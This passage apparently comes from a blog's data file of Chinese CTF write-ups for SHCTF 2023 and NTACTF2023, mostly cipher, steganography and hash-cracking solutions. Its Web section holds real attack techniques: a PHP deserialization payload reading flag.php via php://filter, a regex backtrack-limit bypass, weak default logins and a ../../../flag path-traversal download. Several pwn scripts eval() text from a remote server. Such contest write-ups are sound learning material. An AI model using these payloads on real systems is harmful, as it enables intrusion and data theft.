&quot;34cfd54dcf443a572cbfa7c1cb90af1b580b98d4d42274ea3c99c25390065a985c81354ddc2e54e243f5be21b90f435b&quot;: a14 = i else: pass for i in str_list: for j in str_list: for m in str_list: n = i+j+m if hashlib.md5(n.encode()).hexdigest() == &quot;50680fbb1bc80ff7ac8d5cdd0bee77fd&quot;: a15 = n else: passfor i in str_listt: if hashlib.sha512(i.encode()).hexdigest() == &quot;5b1fac8ceb254baeb8a794c105ef61f99b59d592ad1803b614be85fe12311a9b68307570f4e996fb20dbe82e2fcd65b0da16ecfa5577cebf178e0beabe271112&quot;: a16 = i else: passfor i in str_listt: if hashlib.sha224(i.encode()).hexdigest() == &quot;a715591d887d66ed248ae4cc5aea34995d2feeb1130de534a7ecfdde&quot;: a17 = i else: passfor i in str_listt: if hashlib.sha256(i.encode()).hexdigest() == &quot;472e73d796e20aa8ff9059e6316f218e0322548f661ec4dc267507ed66317404&quot;: a18 = i else: pass for i in str_listt: if hashlib.sha512(i.encode()).hexdigest() == &quot;d364a863110f07538a9f0e6b1e42b382979a7b26a53a554ecd35b8f08634ee8067119c4ddc48b9b1a0f6c266fdaeb698dfda95f122b2314e55700aa244fbe138&quot;: a19 = i else: pass a20 = &#x27;9&#x27;flag = a1 + a2 + a3 + a4 + a5 + a6 + a7 + a8 + a9 + a10 + a11 + a12 + a13 + a14 + a15 + a16 + a17 + a18 + a19 + a20print(flag) Misc [WEEK1]请对我使用社工吧 根据给到的图片，我们可以发现的信息有，万达东厅，一家幸运好玩的点，以及商城的部分装饰 前往搜索引擎搜索一家幸运好玩的店找到一张图片如下 其中发现彩票店后的楼梯与题目中给出的类似，确定社工的地址为山东东营，东营只有一所中国石油大学，所以flag{山东省____东营市____东营区_中国石油大学} [WEEK1] 也许需要一些py 打开题目压缩包后得到摩斯电码，解密后得到 1this1sy0ukey 作为密码成功解压压缩包 得到无后缀文件与txt文件 使用010打开flag文件后发现文件头损坏改为png文件头后成功打开 结合flag.txt文件后 12345678910111213141516171819202122import hashlibdef letter(s:str): res=[] def dfs(idx,n,s:str): if idx ==n: res.append(s) return if s[idx].islower(): dfs(idx+1,n,s[:idx] +chr(ord(s[idx])-32) +s[idx +1:]) if s[idx].isupper(): dfs(idx+1,n,s[:idx] +chr(ord(s[idx])+32) +s[idx +1:]) dfs(idx +1,n,s) dfs(0,len(s),s) return resfor s in letter(&quot;pNg_and_Md5_SO_GreaT&quot;): if hashlib.md5(s.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest() == &quot;63e62fbce22f2757f99eb7da179551d2&quot;: print(s) print(&quot;su&quot;) exit() 得到flag为 1flag&#123;Png_AnD_md5_so_GReAt&#125; [WEEK1] ez-misc 打开01game文件后发现841个0和1，841为29x29，判断为二维码 1234567891011121314from PIL import Imagestrings = open(r&quot;01game.txt&quot;,&#x27;r&#x27;).read()pic = Image.new(&quot;RGB&quot;,(29,29))num = 0for x in range(29): for y in range(29): if strings[num] == &#x27;1&#x27;: pic.putpixel((x,y),(0,0,0)) else: pic.putpixel((x,y),(255,255,255)) num +=1pic.show() 得到二维码 扫描后得到 1hit_k1sme4_4_fun 得到压缩包密码，成功解压出flag文件，使用010打开后发现为zip文件，更改后得到带密码的压缩包，并带有hint 101110010011011110110001101101011011110010110111101110101 解密为 1rockyou 联想到kali的rockyou密码本，使用密码本爆破得到密码为 1palomino 得到flag.txt中为 1ksgeylalssgSlHffgS&#123;&#123;gHklesgg&#123;afkH&#123;lHalSkgygf&#123;&#123;kfgslg1l11Ss&#123;ellal&#123;f&#123;fka&#123;l&#123;gllaHf1elSsa14Hyl&#125;f&#125;Slmyfg4gleSlk1k&#123;Sfggga4aHg&#125;SlllgHHfgy1Sgaakfga1HmH&#123;sylgs&#123;ffkHyyaals&#123;S&#123;almklagfskyg&#123;f1a1yffe&#123;&#123;SSSylHagf1&#123;S&#123;Ham&#123;Sf&#125;ga&#125;fHlgl&#123;aSl1&#123;lkyfff&#125;flkHffaagHegSaHSkafgH&#123;ymaykSylS&#123;&#123;1llf&#123;efeHfaalaSafflmSlylaslfk&#125;mlllaaHSfk&#123;SyH&#123;yayyf&#123;lyy1ylaff&#123;aaygfl2333amSaeHy&#123;fms&#123;ySamkSga&#123;ffylaalHlfgfglafHSSH&#123;algmff1SSHHflSkSeygff14sgSl1ff41HkHaaal&#123;k553klgfffmslk&#123;Haylam&#123;&#123;llfggSlggaya&#123;SaSg&#123;lya&#123;fflyaafk&#123;aflkgay&#123;kHg&#123;fgkff1&#123;akefeSlfmySkgglka&#123;mSfmSemgykSSl1gfgHllgkygmfafmfakaaegafHgklSklaaH1HglgfeS41lgkS&#123;ggaHmmSlfykfas4f&#123;afgHaa&#123;ylaf&#123;&#123;eHS4lHf&#123;gfg&#123;eSlSf&#123;gsaSgyfSyHfHHagkSaS&#123;&#123;fa1yalsf&#123;flf1f&#123;&#123;&#123;fafakfsmaef4amHsyfSaH56789gfl&#123;&#123;&#123;1yySlkael41Say&#123;faffaSHy4Ss&#123;eHyfmlykSm&#125;&#123;&#123;ygaalgg&#123;kHlHelffHasfaaf&#123;SykfS666l&#123;SS1&#123;SygfgaHgSllf4effgHHykklSl1ga1lHafsy&#123;f&#123;141yaakllla1al4SaffgflalkSS1llg1&#123;af&#123;SyygsSSseHffemfHlaflfgkeag&#123;gfSgmlkmflSlgHkSfylffllHya&#123;ksgySlHHglg&#123;H1lyf&#123;f1gggHaffS&#123;afalafg7825fakaSfyfg11gfHkfySsaaafff1&#123;mfgalfa&#123;gay1ySf&#123;asHgg1HaHfkl1la11fsg&#123;S11all&#123;g&#123;lyfHeala&#123;f1agg&#123;fHHglH1&#123;SSfaSleyayaSy&#123;yHylyHHl&#123;ggayf&#125;f11a&#123;asf&#123;gmf&#123;&#123;&#123;SykHk1sSm1l&#125;sgmSSff11a&#125;SaSfHsmg&#125;g&#123;kallf&#123;llHssl&#123;ffsffagHgkHaa&#123;f&#123;f&#123;alfglgaaS4sgHmkgSagl1lfSslfHyf&#123;fglH&#123;llfsaaSaglslgy11yfykHygf&#123;lyfyfg&#125;gafgSfaeg4fka&#123;SaHllk&#123;&#123;fks&#123;1f1S1gyl&#123;fflkyllafHl1Sslgyga&#123;llkHlHyaylgaf&#123;skSH1yyfgf&#123;Sflg&#123;4aHSa&#123;kkekH&#123;yygmygl&#123;gf1aleglfm&#123;ygHSHHykSH&#123;Hl&#123;y&#123;&#123;Sa&#123;k&#123;gg1ayfayg&#123;gSg&#123;ffg1llHsa&#123;Hls1Slfg&#123;m&#123;fHHf&#123;mm&#123;l1llk&#123;fffeyH4falla#s1&#123;lyggaykeffS&#123;lkgls&#123;gkeak&#123;l1gS&#123;kH4f&#123;lglgkSagS1yfem11&#123;ml1fsklyllSlgfseag&#123;glkSSfl1ylffalmgfsfaHly4k&#123;saSSkkSH&#123;malf&#123;&#123;g&#123;gSm1lafyy&#123;lsall&#125;aHg1aafaS1klSaHHa&#123;llfSesaySgafgeySllaH1s&#123;gygHHSfy&#123;HSa&#123;l&#123;ffka1alkfagsge&#123;lfgflgk&#123;Slfl&#123;ya&#123;gff1aHmfSgHSsf1SalS5656alfyyllfa&#123;yk&#123;s&#123;&#123;lfaSay&#123;&#123;gaH&#123;HS&#123;aSly1slyHfgaHm&#123;S&#123;ggffmSHakafaSHmSHS&#123;alkggfkHHgy&#123;eS1g&#123;HklfHgH&#123;a41a&#123;gsflgfaygSsfaglygl1ffHlysllsSsf&#123;HlHaaSl&#123;kgflkH&#123;sgykyHfsyHly&#123;klHgSfSal4f1lya4lkala&#123;f（SH&#123;laf1kffyylfflgffg&#125;Sa1HsllSSS1aHgglHl&#123;alHffg1eylsffsysllkSfllgylS&#123;fHSSmlagHflSH1Hmalsg&#123;af&#123;SlySleyfHfasH&#125;SeyalslkagySHaffaffmfggaam1kal&#123;Sff&#123;&#123;alg&#123;s&#123;lsgHmaHSmllgHfaHSl11sHlgygskgHmkaaa1fllfggf&#123;ggygffygfyfkgS1sgS&#123;gfflHa1lagSe&#123;fffga1sS&#123;&#123;H&#123;gSsfHSg&#125;Ha&#123;Slf#$%1asa1gyfllS&#123;yflyg1sSSmkfyykfggaHfHHkSfa&#123;fSleskmagslgeflllayff&#123;ySslySl&#125;kf&#123;agsgkkmHklHSs&#123;k&#125;glllmys1fSll1fSgyy&#123;&#123;sa&#123;mga&#123;gaka1lH1malfklSHaaklfklf1fglakalyaHas1ff4HfffSayg&#123;&#123;gH1kse&#123;gage&#123;skHaSHy1fekHgayk1gkgmS&#123;g&#123;1glgSfy&#123;mg&#123;asg&#123;fkafalfygf&#123;l1SHSl1ka&#123;&#123;ayHkS1g&#123;ay1glSaSHa&#123;Hsff1lfS4H&#123;&#123;ae1lHSlllSmafHSH&#123;kak&#123;ggy1H&#123;fagSH4a1HfSgl&#123;a&#125;a&#123;Sf&#123;lHHf&#123;kayl1l&#123;flSfglfelySggfal&#123;a&#125;&#123;aa&#123;S1gf1SaHfaf&#123;SmaSgHl&#123;falHyggHg&#123;ggglff&#123;klfkSfyllSgk&#125;gfafayHHygaflkS&#123;als&#123;SflkSls1fSgygygf4fHHge&#125;flyggafS&#123;fmafl&#123;fyykHafSHH&#123;14af1ysaH&#123;lkfk&#123;kSS1&#123;fafH&#123;1mHall&#123;sflffa1fl1llf1SkyfafeHa&#123;gfkSlggfsgmSlH&#123;gSllHaSHa1&#123;faSyllyysa&#123;1sfla&#123;1SmfSgy1lslayfaya1agHl4a&#123;fSmmaklHkafkfHfgyHSS&#123;&#123;ay&#123;ylaH1ylHH&#123;gsyHHflfSyg2^%efSlfygg&#123;Sfa&#123;&#123;kSfy&#123;fHlaag&#123;lllagl&#123;aSfkHkgaSfafSfSafl1yss1ymHSSseafk&#123;&#123;a&#123;f&#123;Sa&#123;Hsffffyam4HmmkSakfagyHkglgSefsagmHSaa&#123;lSlykH&#123;lSlHagysgak&#123;llfys&#123;4&#123;Sl4gyamfa&#123;yllf&#123;SSgf&#123;&#123;4g&#123;&#123;alfkg&#123;yklaSgyklyHglsalgfaS4aH4llk&#123;Sl&#123;gkyH&#123;kgsSg&#123;kgkma&#125;kya&#123;sgf&#123;Hfll1ay@gk4sSgeHg&#123;4fHlsskaSaaffffHHSgakSmS1lsa&#123;gsSf&#123;gfylH&#123;l1&#123;gHSaga&#123;lgkkHHH&#123;mfkgHaf1&#123;SlSkHffggsH&#123;HlHmSyfylHSg1SlgggafSHSalfgfae1S1amHfele&#123;lyf11SgSsS&#123;fSs1g&#123;S1yyfSylS&#123;sgSlg&#123;lflSSeaSSgsHSegllygylaflag&#123;&#125;fglgHlSaH&#123;SsaalyHfgkalfyfHmly1fsyyySS4SasagflaS&#123;&#123;yfayl4HHlksl&#123;lHkfSlfyaaff&#125;HkffgSyHl&#123;a1&#123;gSglsafSmfegsgsHfkafSg&#123;falmgf&#125;&#123;llHHkHkHyslagHyfg&#123;f&#123;&#123;lSe&#123;gaSmfH1y&#123;&#123;g&#123;&#125;as1&#123;&#123;af&#123;flH&#123;gaglSSaSaSffg1afgallggyaa&#123;&#123;yalS4ykSySk1gky&#123;gs&#123;g&#123;ll1lSlyafykgg1fs&#123;4&#123;1fslfS&#123;slkSy4mskHkflyf&#123;lk4f1aS2359afall1kk&#123;eg1fyH&#123;l1agylyf&#123;HkSyg&#123;mall&#123;l1g1f1laayfHslalykkylslma&#123;4s&#123;HagSka1Hsal1kHkSSfSy1&#123;Skyags&#123;kHmfglglf&#123;lg&#123;fa1fgSmllmffksgafgl1aa&#123;lmmay&#123;ySglHfH4l4Hf&#123;&#123;&#123;gllylgSafHgfHllSefgaSlf&#123;fgf&#123;lgSS@syl&#123;gkSmkaykllHSy1ffkSS1aSfeggSgsyflHaHHlkklHaslf&#123;&#125;Ss&#123;laaHalHSHyskSgkySl&#123;&#123;Sgsaf1Hlfaykg&#123;Hkll&#123;sasl1ffe&#123;&#123;kkkfgy1ffHflsglfgSfHffy11y&#123;fffly1yklk&#123;fHHmagalfygHaglfSfSSakfflaHffl&#123;ffglfaHg&#123;skaal&#123;fHfSSfy1Hfffmy&#123;llllffma&#123;eaS&#123;s&#123;lgHHlSaef1glSfgH4esaSyHy&#123;aSfagHlkll1fkfHf&#123;m1SsSk&#125;ygfylgS11&#123;flkflkaksflafk&#123;llsfafsfay&#123;1lfgygHSgfH4gSfS&#123;mySHasf1aSkffsykkS1lfHagffa&#123;fHlyaHe&#123;SSfS&#123;&#125;S&#123;gyykefkl&#123;&#123;afl1ffykSkyH&#123;klSsgfSk&#123;g1&#123;f1klffSsa1&#123;afaagH&#123;s&#123;a&#123;1agafa1sfgmkf1gfylggSfkaSalHffHgf&#123;gHSfgHsglmllsllyfmH&#123;sySSgHSaa1flSfgkglms4&#123;HffHgfgSaglafg&#123;yakgg&#123;algfyl&#123;HH1feaagllgsHlfglaHkfkfglfy1&#123;mHlmgfkSay1fHkfskmsyklsyska&#123;&#123;1HagHSySkHleflakkH&#123;Sgfy&#123;faff&#123;Hgmk1fky1lffag&#123;fSggySamlyfgffHgll&#123;lfkSfHafyfal@@@ffllkmylf&#123;yklH&#123;aya&#123;14yla&#123;SlllyaHaaa&#123;e1gamamaSskmkaafyalgffle&#123;aHym&#123;s1lf&#123;l1aaSe&#123;lgHf&#123;klkHH&#123;&#123;&#123;HlfyHaHaa1Sa&#123;SSggHl1&#123;magf11kH1kHsyg&#123;&#123;g1&#123;afySmy111klykagHSksgflesggggleg&#123;aalSm&#123;asgfg1&#123;ylHfa&#123;alSllg&#123;HkggksHlfml&#123;a1HafamflHaa1alfygHSgS1l1fHaa1maSa&#123;lfalalkSyaa&#123;f 使用字频分析得到flag 1flag&#123;SHyk1sme4&#125; [WEEK1]签到题 题目: 1Wm14aFozdDBhR2x6WDJselgyWnNZV2Q5 使用两次base64解密后得到 1flag&#123;this_is_flag&#125; [WEEK1]Steganography 解压后得到两张图片，压缩包。先对careful.jpg分析 使用010打开后发现结尾有 1MTJlcmNzLi4uLi45MDlqaw== 解密后为 112ercs.....909jk 对careful1.jpg分析，查看属性后发现 1xqwed 替换之前得到的字符串中的五个点后得到 112ercsxqwed909jk 解压压缩包得到 1flag&#123;4d72e4f3-4d4f-4969-bc8c-a2f6f7a4292c&#125; [WEEK1] 可爱的派蒙捏 将图片使用binwalk分离后得到两端文本，对比两段文本的不同 1234567891011121314151617def read_file(file_path): with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file: return file.read()def compare_files(file1_content, file2_content): flag = &#x27;&#x27; for i in range(len(file1_content)): if file1_content[i] != file2_content[i]: flag += file2_content[i] return flagif __name__ == &quot;__main__&quot;: file1_path = r&quot;C:\\Users\\g0ubu1i\\Desktop\\SHCTF\\Misc\\WEEK1\\可爱的派蒙捏\\_1.jpg.extracted\\txt1.txt&quot; file2_path = r&quot;C:\\Users\\g0ubu1i\\Desktop\\SHCTF\\Misc\\WEEK1\\可爱的派蒙捏\\_1.jpg.extracted\\txt2.txt&quot; file1_content = read_file(file1_path) file2_content = read_file(file2_path) flag = compare_files(file1_content,file2_content) print(flag) 得到flag 1flag&#123;4ebf327905288fca947a&#125; [WEEK1] message 题目 10001000D91683106019196F40008C26211002072B975915730671B54114F60000A000A592982B15C065265843D8A938A00000A000A5E8A9AA453D883525730000A000A91527CBE518D6E1751656CEA75D5000A000A6C899ED852305BF94E0D8D77000A000A8FD94E0053CC624B535191195230002062B14F4F4F6000530048004300540046007B00620061003900370038003400300035002D0062003100630038002D0038003400370063002D0038006500360039002D006600360032003100370037006500340063003000380037007D 直接进行hex解码后得到 1S H C T F &#123; b a 9 7 8 4 0 5 - b 1 c 8 - 8 4 7 c - 8 e 6 9 - f 6 2 1 7 7 e 4 c 0 8 7 &#125; [WEEK1] 真的签到 关注公众号 [WEEK1] 远在天边近在眼前 下载压缩包后发现flag在文件夹名中间并反向 1&#125;\\d\\1\\f\\a\\9\\1\\7\\c\\4\\a\\d\\4\\_\\?\\t\\H\\9\\I\\R\\l\\A\\_\\y\\S\\a\\E\\_\\y\\1\\I\\A\\e\\r\\_\\5\\I\\_\\5\\1\\H\\T\\&#123;\\g\\a\\l\\f 123456strr = r&#x27;&#125;\\d\\1\\f\\a\\9\\1\\7\\c\\4\\a\\d\\4\\_\\?\\t\\H\\9\\I\\R\\l\\A\\_\\y\\S\\a\\E\\_\\y\\1\\I\\A\\e\\r\\_\\5\\I\\_\\5\\1\\H\\T\\&#123;\\g\\a\\l\\f&#x27;flag =&#x27;&#x27;for i in strr: if ord(i) != 92: flag += iprint(flag[::-1]) 处理后得到 1flag&#123;TH15_I5_reAI1y_EaSy_AlRI9Ht?_4da4c719af1d&#125; [WEEK1] 奇怪的Screenshot 猜测为CVE-2023-28303，使用工具对截图修复 得到 百家姓密码，解密后得到 1flag&#123;CVE-2023-28303-Win11-Snipping-t00l-is-n0t-Secure&#125; [WEEK2] 表里的码 修改sheet.xml文件，确保表格为29x29,令s=4的为1，其余为0。使用pillow得到二维码 1234567891011121314151617181920212223242526from PIL import Imageimport osfrom xml.dom.minidom import parsexml_file = r&quot;sheet2.xml&quot;strings = &quot;&quot;domtree = parse(xml_file)rootNote = domtree.documentElementrow = rootNote.getElementsByTagName(&#x27;c&#x27;)for i in row: c = i.toxml() if &#x27;s=&quot;4&quot;&#x27; in c: strings += &#x27;1&#x27; else: strings += &#x27;0&#x27;pic = Image.new(&quot;RGB&quot;,(29,29))num = 0for x in range(29): for y in range(29): if strings[num] == &#x27;1&#x27;: pic.putpixel((x,y),(0,0,0)) else: pic.putpixel((x,y),(255,255,255)) num +=1pic.show() 扫码后得到 1flag&#123;j0k3r_1s_my_wif3&#125; [WEEK2] 可爱的洛琪希 下载压缩包后存在伪加密，使用010修改09为00 得到roxy.txt 1/9j/4AAQSkZJRgABAQEAYABgAAD/4REYRXhpZgAATU0AKgAAAAgABwEAAAMAAAABA+gAAAEBAAMAAAABBkAAAAESAAMAAAABAAAAAAEyAAIAAAABAAAAAIdpAAQAAAABAAAIepyfAAEAAABOAAAQwuocAAcAAAgYAAAAYgAAAAAc6gAAAAgAAAAAAAAc6gAAAAg通过base64解图片得到图片 通过010打开得到密文与key 12密文：33736c6e6f7b52626b795f71696966686b76217dkey：nanian 首先使用hex解密密文，再使用维吉尼亚密码得到 1flag&#123;Roxy_daisuki!&#125; [WEEK2]图片的秘密 将题目通过binwalk分离后得到图片 使用盲水印工具fft得到flag [FINAL]问卷 关注公众号进入问卷获得flag PWN [WEEK1] nc 使用nc连接后cat flag得到flag [WEEK1] 口算题 nc 连接后提示需要计算，使用pwntools编写脚本得到flag 1234567891011121314151617from pwn import * p=remote(&#x27;112.6.51.212&#x27;,31745)p.sendafter(&#x27;start...&#x27;,b&#x27; &#x27;)p.recvuntil(&#x27; &#x27;)s=p.recv()s = s.replace(b&quot;\\xc3\\x97&quot;, b&quot;*&quot;)s=s.replace(b&quot;\\xc3\\xb7&quot;,b&quot;/&quot;)answer=eval(s[:-4])p.sendline(str(answer))for i in range(199): p.recvuntil(&#x27; &#x27;) p.recvuntil(&#x27; &#x27;) s=p.recv() s = s.replace(b&quot;\\xc3\\x97&quot;, b&quot;*&quot;) s = s.replace(b&quot;\\xc3\\xb7&quot;,b&quot;/&quot;) answer=eval(s[:-4]) p.sendline(str(answer)) Web [WEEK1] babyrce 首先使用ls查看路径 再绕过过滤cat flag [WEEK1] 1zzphp 首先通过数组绕过n的过滤，再通过回溯次数限制绕过c_ode,通过python获取flag 123456import requestsurl = &#x27;http://112.6.51.212:30662//?num[]=m&#x27;payload = &#123;&#x27;c_ode&#x27;:&#x27;1111&#x27;*260000+&#x27;2023SHCTF&#x27;&#125; response = requests.post(url=url, data=payload)print(response.text) [WEEK1] ez_serialize payload: 1O:1:%22B%22:1:&#123;s:1:%22q%22;O:1:%22C%22:2:&#123;s:3:%22var%22;N;s:1:%22z%22;O:1:%22D%22:1:&#123;s:1:%22p%22;O:1:%22A%22:1:&#123;s:5:%22var_1%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;&#125;&#125;&#125;&#125; 得到flag.php通过base64加密的内容 解密后得到 [WEEK1] 登陆就给flag 通过弱口令admin/password登陆后得到flag [WEEK1] 飞机大战 查看main.js得到 解密后得到 1flag&#123;e6cc550d-2a12-47a5-a890-0d522755548e&#125; [WEEK1] ezphp [WEEK1] 生成你的邀请函 12345678910111213import requestsfrom PIL import Imageimport iourl = &#x27;http://112.6.51.212:32990/generate_invitation&#x27;Body = &#123; &quot;name&quot;: &quot;g0ubu1i&quot;, &quot;imgurl&quot;: &quot;http://q.qlogo.cn/headimg_dl?dst_uin=1738327323&amp;spec=640&amp;img_type=jpg&quot;&#125;re = requests.post(url=url,json=Body)image_content = re.contentimage = Image.open(io.BytesIO(image_content))image.save(&quot;avator.jpg&quot;) 得到邀请函上的flag [WEEK2] EasyCMS 通过默认密码admin/tao登录后台 通过任意文件读取漏洞获得flag 进入后台后任意点击一个下载后抓包，将下载地址改为…/…/…/flag 成功下载到flag [WEEK3] 快问快答 使用python获取的计算式后将答案提交，最终获得flag 123456789101112131415161718192021222324252627import reimport requestsimport times = requests.Session() url = &#x27;http://112.6.51.212:31025/&#x27;r = s.get(url)r.encoding = &#x27;utf-8&#x27;for w in range(50): num = re.findall(re.compile(r&#x27;&lt;h3&gt;题目：(.*?)=&#x27;), r.text)[0] time.sleep(1) temp = &#x27;&#x27; for i in num: if i == &quot;÷&quot;: temp += &quot;//&quot; elif i == &quot;与&quot;: temp += &quot;&amp;&quot; elif i == &quot;x&quot;: temp += &quot;*&quot; elif i == &quot;异&quot;: temp += &quot;^&quot; elif i == &quot;或&quot;: pass else: temp += i num = temp r = s.post(url, data=&#123;&#x27;answer&#x27;: eval(num)&#125;) print (r.text) RE [WEEK1]signin 使用ida打开题目后得到flag [WEEK2] pycode 通过题目得到py文件,再编写解密脚本 1234567891011121314151617import base64value = &#x27;&#x27;flag = &#x27;&#x27;obfuscated_output = &#x27;==AeAF3M-tzO-giQ-AUQosDQ9tGK7MDPuhC47tDNB5Tb8Yn4sdW4&#x27;obfuscated_output= obfuscated_output.replace(&#x27;t&#x27;,&#x27;0&#x27;)obfuscated_output = obfuscated_output.replace(&#x27;4&#x27;,&#x27;c&#x27;)obfuscated_output = obfuscated_output.replace(&#x27;-&#x27;, &#x27;+&#x27;)output = base64.b64decode(obfuscated_output[::-1]).decode()for i in range(len(output)): temp = output[i] temp = chr(ord(temp) - 3) value += tempfor i in range(len(value)): temp = value[i] temp = chr(ord(temp) ^ 8) flag += tempprint(flag)","tags":["writeup","CTF","SHCTF"],"categories":["Writeup"]},{"title":"NTACTF2023","path":"/posts/b0d6e55d.html","content":"NTACTF2023 Crypto sign_in 题目： 1佛曰：冥藝涅呐遮奢都除哆悉冥心罰所諳娑隸呼哆朋俱特哆漫梵姪罰帝大伽侄地彌梵遮娑皤道罰度奢。冥輸以諳怛密皤礙多以耨奢迦哆漫南冥數參曰怯竟怯吉冥智羯等缽陀侄涅故遠呐老諳穆梵栗有梵呼怯盧俱盧若盧度俱怖者夜一皤藝跋 使用与佛论禅解密得到 1flag&#123;fochan_Welcome_to_NTA2023&#125; 我不是猪，我是佩奇！哼唧！ 题目 使用猪圈密码解密后得到 1xiyounetyyds new_base64 题目 1[5, 11, 0, 6, 62, 61, 57, 0, 53, 56, 56, 58, 0, 59, 53, 54, 52, 4, 56, 0, 5, 57, 2, 52, 2, 60, 60, 59, 60, 0, 1, 1, 59, 4, 58, 3, 54, 63] 1new_base64 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;&#x27; 判断题目列表为字符串的索引，使用python脚本解密 123456listt = [5, 11, 0, 6, 62, 61, 57, 0, 53, 56, 56, 58, 0, 59, 53, 54, 52, 4, 56, 0, 5, 57, 2, 52, 2, 60, 60, 59, 60, 0, 1, 1, 59, 4, 58, 3, 54, 63]new_base64 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;&#x27;flag = &#x27;&#x27;for i in listt: flag += new_base64[i]print(flag) flag为 1flag&#123;95a1446a7120e4af5c0c8878abb7e6d2&#125; 我吃两碗base 题目： 1ZmxhZ3s1NDQ4Njk3MzIwNjkzNDVGNkU1NDYxNDM1NDQ1NTIyMDU5NTk0NDUzMjB9IApUcnkgaXQgYWdhaW4sIGJ1dCB0aGlzIHRpbWUgaW4gYSBkaWZmZXJlbnQgd2F5 使用base64解密得到 1flag&#123;544869732069345F6E546143544552205959445320&#125; 使用hex解密得到 1THis i4_nTaCTER YYDS 米斯嘎，木斯嘎，神奇的阿斯克码 题目： 1flag = [102, 108, 97, 103, 123, 48, 56, 97, 97, 102, 55, 98, 53, 100, 51, 98, 102, 49, 57, 55, 57, 99, 49, 102, 100, 49, 56, 51, 53, 49, 55, 99, 101, 99, 98, 50, 51, 125] 使用python脚本得到 12345flag = [102, 108, 97, 103, 123, 48, 56, 97, 97, 102, 55, 98, 53, 100, 51, 98, 102, 49, 57, 55, 57, 99, 49, 102, 100, 49, 56, 51, 53, 49, 55, 99, 101, 99, 98, 50, 51, 125]a= &#x27;&#x27;for i in flag: a += chr(i)print(a) 1flag&#123;08aaf7b5d3bf1979c1fd183517cecb23&#125; where is my key 题目 1234567891011121314151617flag = &quot;******&quot;m = &quot;flag&#123;&quot; + flag + &quot;&#125;&quot;c = &quot;&quot;key = &quot;***&quot;key_list = []j = 0for i in range(len(flag)): key_list.append(int(key[j]) ^ i) j += 1 if j == 3: j = 0for i in range(len(flag)): c += chr(ord(flag[i]) + key_list[i])print(c) 根据题目猜测密码为130 使用python 12345678910111213c= &quot;5:fch7@:&gt;m&gt;lC&gt;pDtwLDHKxHQ&#125;MMQMV&#125;&quot;key = &quot;130&quot;key_list = []j = 0flag = &#x27;&#x27;for i in range(len(c)): key_list.append(int(key[j]) ^ i) j += 1 if j==3: j=0for i in range(len(c)): flag += chr(ord(c[i]) - key_list[i])print(flag) 得到 148daa2966e5a60b6af9447c18c33207a I am Julius Caesar 题目 1lsip&#123;Gpxpcbu_kg_Gyoslpj&#125; 判断凯撒加密，若lsip对应flag，则偏移量对应为6，7，8，9，偏移量应该为依次递增， 脚本 123456789101112131415161718192021222324strt = r&quot;lsip&#123;Gpxpcbu_kg_Gyoslpj&#125;&quot;key = 6flag = &#x27;&#x27;for i in strt: if i == &quot;&#123;&quot; or i == &quot;&#125;&quot; or i == &quot;_&quot;: pass else: if ord(i) &lt; 97: index = ord(i) - 64 if key &gt; index: move = 26 - (key - index) i = chr(64 + move) if key &lt;= index: i = chr(ord(i)-key) if ord(i) &gt;= 97: index = ord(i) - 96 if key &gt; index: move = 26 - (key - index) i = chr(96 + move) if key &lt;= index: i = chr(ord(i)-key) key += 1 flag += iprint(flag) 得到 1flag&#123;Welcome_to_Network&#125; 麻辣兔头 题目： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook!Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! 